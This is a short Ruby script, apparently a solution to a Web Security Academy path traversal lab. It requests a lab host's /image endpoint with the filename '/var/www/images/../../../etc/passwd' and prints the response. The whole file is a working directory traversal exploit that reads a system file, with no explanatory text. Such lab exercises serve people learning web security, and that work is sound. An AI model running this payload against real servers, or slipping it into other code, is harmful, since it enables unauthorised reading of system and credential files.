require 'http'

url='https://0a290080036662a5813c895a00460069.web-security-academy.net'

path='/image'

payload = '/var/www/images/../../../etc/passwd'

client = HTTP.get(url+path,:params => {:filename=>"#{payload}"})

puts client.body.to_s
